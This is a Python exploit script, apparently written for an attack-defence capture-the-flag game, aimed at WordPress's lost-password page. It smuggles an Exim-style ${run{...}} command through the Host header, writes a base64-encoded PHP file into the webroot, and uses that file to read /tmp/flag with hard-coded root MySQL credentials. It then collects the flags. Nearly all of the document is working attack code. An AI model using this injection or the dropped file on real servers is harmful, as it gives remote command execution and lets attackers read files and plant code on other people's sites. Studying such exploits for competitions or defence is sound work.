import requests


def submit(flag):
    print(flag)

def generate_command(command):
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command

def attack(target):
    target = "http://" + target
    user = 'ichunqiu'
    session = requests.session()
    data = {
        'user_login': user,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }
    session.headers = {
        'Host': generate_command('/usr/bin/echo PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwplY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCIvdG1wL2ZsYWciKSAuICcsJzsKCiRzZXJ2ZXJuYW1lID0gIjE3Mi4xNi4xMC4zIjsKJHVzZXJuYW1lID0gInJvb3QiOwokcGFzc3dvcmQgPSAicm9vdCI7CiRkYm5hbWUgPSAid29yZHByZXNzIjsKIAokY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkVycm9yOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9IAogCiRzcWwgPSAiU0VMRUNUIGxvYWRfZmlsZSgnL3RtcC9mbGFnJykiOwokcmVzdWx0ID0gJGNvbm4tPnF1ZXJ5KCRzcWwpOwogCmlmICgkcmVzdWx0LT5udW1fcm93cyA+IDApIHsKICAgIHdoaWxlKCRyb3cgPSAkcmVzdWx0LT5mZXRjaF9yb3coKSkgewogICAgICAgIGVjaG8gJHJvd1swXTsKICAgIH0KfQoKJGNvbm4tPmNsb3NlKCk7 | /usr/bin/base64 -d > /var/www/html/flag.php'),
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    session.allow_redirects = False
    session.post(target + '/wp-login.php?action=lostpassword', data = data)
    flags = [i.strip() for i in session.get(target + '/flag.php').content.split(',')]
    for flag in flags:
        submit(flag)
    return flags

'''flag.php
<?php
error_reporting(0);
echo file_get_contents("/tmp/flag") . ',';

$servername = "172.16.10.3";
$username = "root";
$password = "root";
$dbname = "wordpress";
 
$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Error: " . $conn->connect_error);
} 
 
$sql = "SELECT load_file('/tmp/flag')";
$result = $conn->query($sql);
 
if ($result->num_rows > 0) {
    while($row = $result->fetch_row()) {
        echo $row[0];
    }
}

$conn->close();
'''

# if __name__ == "__main__":
#     attack('172.16.9.20')